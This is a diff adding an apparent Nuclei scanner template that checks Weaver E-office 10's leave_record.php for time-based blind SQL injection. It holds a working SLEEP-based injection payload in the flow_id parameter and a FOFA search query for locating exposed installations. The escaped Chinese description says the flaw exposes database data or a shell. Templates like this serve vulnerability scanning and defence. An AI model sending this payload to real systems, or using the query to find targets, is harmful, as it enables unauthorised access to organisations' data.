@@ -1,0 +1,33 @@
+http:
+- matchers:
+  - dsl:
+    - duration>=5
+    type: dsl
+  raw:
+  - '@timeout: 10
+
+    GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: eoffice-v10-leave-record-sqli
+info:
+  author: Co5mos
+  description: "\u6CDB\u5FAEeoffice10\u534F\u540C\u529E\u516C\u5E73\u53F0\u662F\u4E00\
+    \u6B3E\u4E13\u4E1A\u7684office\u529E\u516C\u5DE5\u5177\u8F6F\u4EF6\u3002\u8F6F\
+    \u4EF6\u652F\u6301\u5728\u7EBF\u591A\u4EBA\u7F16\u8F91\u6587\u4EF6\uFF0C\u5E76\
+    \u4E14\u4F1A\u5728\u7B2C\u4E00\u65F6\u95F4\u6536\u53D1\u534F\u4F5C\u9700\u6C42\
+    \u3002\u5341\u5206\u65B9\u4FBF\u5FEB\u6377\uFF0C\u754C\u9762\u7B80\u7EA6\uFF0C\
+    \u5E03\u5C40\u76F4\u89C2\u6E05\u6670\uFF0C\u64CD\u4F5C\u7B80\u5355\uFF0C\u6781\
+    \u6613\u4E0A\u624B\uFF0C\u662F\u4E00\u6B3E\u4E0D\u53EF\u591A\u5F97\u7684\u5229\
+    \u5668\u3002\u6CDB\u5FAEE-office 10 leave_record\u5B58\u5728SQL\u6CE8\u5165\u6F0F\
+    \u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u8BE5\u6F0F\u6D1E\u83B7\u53D6\
+    \u6570\u636E\u5E93\u654F\u611F\u4FE1\u606F\u751A\u81F3getshell\u3002\n"
+  metadata:
+    fofa-query: body="eoffice10" && body="eoffice_loading_tip"
+  name: "\u6CDB\u5FAEE-office 10 leave_record.php\u63A5\u53E3SQL\u6CE8\u5165\u6F0F\
+    \u6D1E"
+  severity: critical
+  tags: eoffice10, sqli, weaver
